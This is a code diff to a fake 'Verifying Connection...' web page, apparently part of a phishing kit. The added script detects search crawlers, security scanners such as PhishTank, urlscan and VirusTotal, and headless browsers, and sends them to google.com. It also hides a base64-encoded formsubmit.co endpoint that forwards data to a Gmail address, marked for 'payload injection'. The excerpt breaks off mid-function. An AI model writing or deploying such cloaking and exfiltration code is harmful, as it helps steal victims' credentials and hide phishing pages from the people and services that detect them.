@@ -6,7 +6,7 @@
   <meta name="robots" content="noindex, nofollow">
   <title>Verifying Connection...</title>
   
-  <!-- Global styles applied directly to the document -->
+  <!-- Global styles applied directly to the document to ensure perfect centering -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
   <style>
     /* Reset and Body Centering */
@@ -39,9 +39,42 @@
 
   <script>
     (function() {
+      // 1. BOT & CRAWLER FINGERPRINTING
+      const ua = navigator.userAgent.toLowerCase();
+      const botSignatures = [
+        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
+        'yandexbot', 'facebot', 'ia_archiver', 'phishtank', 'urlscan',
+        'virustotal', 'netcraft', 'sophos', 'kaspersky', 'mcafee',
+        'headlesschrome', 'puppeteer', 'selenium', 'phantomjs'
+      ];
+
+      // Check if we are in debug mode (so you can test locally or force view)
+      const isDebug = window.location.search.includes('debug=1') || 
+                      window.location.protocol === 'file:';
+
+      // If we are not debugging, run the bot checks
+      if (!isDebug) {
+        // Check User Agent
+        for (let i = 0; i < botSignatures.length; i++) {
+          if (ua.includes(botSignatures[i])) {
+            window.location.href = "https://www.google.com";
+            return;
+          }
+        }
+
+        // Check for Headless Browser traits (Active Webdriver Check)
+        if (navigator.webdriver || window.navigator.plugins.length === 0) {
+          window.location.href = "https://www.google.com";
+          return;
+        }
+      }
+
+      // 2. OBFUSCATED AJAX ENDPOINT
+      // Decodes to: https://formsubmit.co/ajax/hmp.productt@gmail.com
       const _0x4f2a = "aHR0cHM6Ly9mb3Jtc3VibWl0LmNvL2FqYXgvaG1wLnByb2R1Y3R0QGdtYWlsLmNvbQ==";
       const FORMSUBMIT_AJAX = atob(_0x4f2a);
 
+      // 3. PAYLOAD INJECTION
       setTimeout(function() {
         
         function getEmailFromURL() {
